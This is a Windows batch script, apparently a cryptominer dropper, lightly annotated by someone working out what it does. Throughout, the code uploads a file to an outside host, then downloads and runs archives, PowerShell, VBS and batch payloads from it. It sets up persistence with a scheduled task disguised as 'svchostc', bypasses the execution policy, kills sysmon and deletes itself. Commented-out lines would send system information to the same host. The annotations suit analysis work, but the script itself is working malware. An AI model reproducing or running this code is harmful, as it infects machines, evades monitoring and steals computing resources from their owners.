echo a > "%TEMP%\aaadsd.txt"

::uploading a file %TEMP%\aaadsd.txt to http://31b4bd31fg1x2.org/uploadfile.php?err=TESTFRONT\
:: most probably trying to guess my ip address
powershell -NoLogo -Command "Invoke-RestMethod -Uri \"http://31b4bd31fg1x2.org/uploadfile.php?err=TESTFRONT\" -Method Post -InFile \"%TEMP%\aaadsd.txt\" -UseDefaultCredentials"

::ping google.com one time with a timeout of 1 second
ping www.google.com -n 1 -w 1000
:: if there is no internet connection then exit
if %errorlevel% == 1 ( exit )

:: downloading a commandline zip extractor
:: if "%TEMP%\7za.exe" is not present then download the file
if not exist "%TEMP%\7za.exe" (
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/7za.exe -OutFile \"%TEMP%\7za.exe\""
)

:: if "%TEMP%\ppuarchive4.zip" is not present then download the file
if not exist "%TEMP%\ppuarchive4.zip" (
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/packagenew_unsigned.zip -OutFile \"%TEMP%\ppuarchive4.zip\""
)

:: if "%TEMP%\bcmuarchive15.zip" is not present then download the file
if not exist "%TEMP%\bcmuarchive15.zip" (
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/packagehwloc2_unsigned.zip -OutFile \"%TEMP%\bcmuarchive15.zip\""
)

:: if "%TEMP%\tmg.ps1" is not present then download the file
if not exist "%TEMP%\tmg.ps1" (
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/trackermagic.ps1 -OutFile \"%TEMP%\tmg.ps1\""
)

:: if "%TEMP%\opokl.txt" doesnot exist then download the file
:: this is just a check to see svctask.xml is moved to the %TEMP% and the following task are executed.
:: Replace all occurence of APPDATA from xml file with the actual path of %APPDATA% folder
:: Schedule a new task form "%TEMP%\svctask.xml" xml file with taskname "svchostc". 
:: Forcefully creates the task and suppresses warnings if the specified task already exists.
:: Then delete the "%TEMP%\svctask.xml" file
:: Make "%TEMP%\opokl.txt" file so that it marks that the task has been completed.
if not exist "%TEMP%\opokl.txt" (
	PowerShell -NoLogo -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/svchostc_task.xml -OutFile \"%TEMP%\svctask.xml\""
	PowerShell -NoLogo -Command "(gc \"%TEMP%\svctask.xml\") -replace 'LOCALAPPDATA', '%LOCALAPPDATA%' | Out-File \"%TEMP%\svctask.xml\""
	schtasks /Create /xml "%TEMP%\svctask.xml" /tn "svchostc" /F
	del "%TEMP%\svctask.xml"
	echo a > "%TEMP%\opokl.txt"
)


:: if "%LOCALAPPDATA%\WindowsDefenderTemp\update.vbs" does not exist then download batchbot.vbs, batchinstaller.bat and batchtask.xml
:: then start batchinstaller\
if not exist "%LOCALAPPDATA%\WindowsDefenderTemp\update.vbs" (
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/batchbot.vbs -OutFile \"%TEMP%\batchbot.vbs\""
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/batchinstaller.bat -OutFile \"%TEMP%\batchinstaller.bat\""
	PowerShell -Command "Invoke-WebRequest -Uri http://31b4bd31fg1x2.org/batchtask.xml -OutFile \"%TEMP%\batchtask.xml\""
	"%TEMP%\batchinstaller.bat"
)


:: connecting to three trackers with port and the following infohash and a chance of 90 
set list=FDBBBAD251AD958202EBB8D72746CEDC85DA45F2 8763B0C12D08BF29E40929B97A05D89721F8387D 4F4BA35DCA24DFA59E3CAADEA01C1094A1D0DB9F 39999E1648D457EC986B80CA2319C3B3E6B6C26B D0011BD12AA2D97084AC8D9E08FAA4C7307D616C EEFD9416DF1F743F26CD0B695C437626D951D752 FA58AD3904381B2E35CD233CD3DEFB13DB83FDC7 92B60DF728B47048D8354AB9C96ADCD60B25B01A 77E386B5AB1046DD872394DED2C93B312B93EAD1 1D8C5463FF555789B3706E4571DD6C512B427A9F 5F72F3EFCF42EAAC871C919FA5C85C1C11FB7F6A
(for %%a in (%list%) do ( 
    :: have to bypass the execution policy because of the error
	:: tmp.ps1 is not digitally signed. You cannot run this script on the current system.
	powershell -NoLogo -ExecutionPolicy Bypass -File "%TEMP%\tmg.ps1" tracker.leechers-paradise.org 6969 %%a 90
	powershell -NoLogo -ExecutionPolicy Bypass -File "%TEMP%\tmg.ps1" tracker.coppersurfer.tk 6969 %%a 90
	powershell -NoLogo -ExecutionPolicy Bypass -File "%TEMP%\tmg.ps1" exodus.desync.com 6969 %%a 90
))

:: Initially submitted a lot of information to the server
:: Then I guess they got bored with so much result and thus decided to drop these
:: Information, I am guessing earlier they used to do something based on this information

::del "%TEMP%\dddfg.txt" /q
del "%TEMP%\bbbd.txt" /q
::wmic path Win32_SystemEnclosure get /format:list >> "%TEMP%\bbbd.txt"
::wmic os get /format:list >> "%TEMP%\bbbd.txt"
::tasklist /FI "IMAGENAME eq sysmon.exe" 2>NUL | find /I /N "sysmon.exe">NUL
::powershell -NoLogo -Command "Invoke-RestMethod -Uri \"http://31b4bd31fg1x2.org/uploadfile.php?err=%ERRORLEVEL%newnew\" -Method Post -InFile \"%TEMP%\bbbd.txt\" -UseDefaultCredentials"

::del "%TEMP%\dddfg.txt" /q
::wmic path Win32_SystemEnclosure get /format:list >> "%TEMP%\dddfg.txt"
::powershell -NoLogo -Command "Invoke-RestMethod -Uri \"http://31b4bd31fg1x2.org/uploadfile.php?err=%ERRORLEVEL%&name=sysenclosure\" -Method Post -InFile \"%TEMP%\dddfg.txt\" -UseDefaultCredentials"
::del "%TEMP%\dddfg.txt" /q
::wmic os get /format:list >> "%TEMP%\dddfg.txt"
::powershell -NoLogo -Command "Invoke-RestMethod -Uri \"http://31b4bd31fg1x2.org/uploadfile.php?err=%ERRORLEVEL%&name=operatingsys\" -Method Post -InFile \"%TEMP%\dddfg.txt\" -UseDefaultCredentials"
::del "%TEMP%\dddfg.txt" /q


:: Doing something to power if charger plugged in
powercfg /SETACVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 6738e2c4-e8a5-4a42-b16a-e040e769756e 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 0012ee47-9041-4b5d-9b77-535fba8b1442 6738e2c4-e8a5-4a42-b16a-e040e769756e 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 29f6c1db-86da-48c5-9fdb-f2b67b1f44da 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 29f6c1db-86da-48c5-9fdb-f2b67b1f44da 0
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 9d7815a6-7ee4-497e-8888-515a05f02364 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 9d7815a6-7ee4-497e-8888-515a05f02364 0
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 1
powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 1



reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v TdrDelay /t REG_SZ /d "8" /f

:: if "%LOCALAPPDATA%\svc10.17134\d.txt" doesnot exist then unzip the zip with
:: 7zip and execute the buildpassive script I guess making the miner
:: building the miner that is 
:: after the job is done then make a file called "%LOCALAPPDATA%\svc10.17134\d.txt just to 
:: signify that the job is done!!
:: then delete the unzipped folder
if not exist "%LOCALAPPDATA%\svc10.17134\d.txt" (
	"%TEMP%\7za.exe" x "%TEMP%\ppuarchive4.zip" -o"%~dp0" -y
	"%~dp0\packagenew\buildpassive.bat"
	echo d > "%LOCALAPPDATA%\svc10.17134\d.txt"
	rmdir /s /q "%~dp0\packagenew"
)



taskkill /f /im sysmon.exe



tasklist /FI "IMAGENAME eq sysmon.exe" 2>NUL | find /I /N "sysmon.exe">NUL
if "%ERRORLEVEL%"=="0" exit


"%TEMP%\7za.exe" x "%TEMP%\bcmuarchive15.zip" -o"%~dp0" -y
"%~dp0\packagehwloc\start.bat"


:: Finally delete the udp.bat file
start /b "" cmd /c del "%~dp0\upd.bat"&exit /b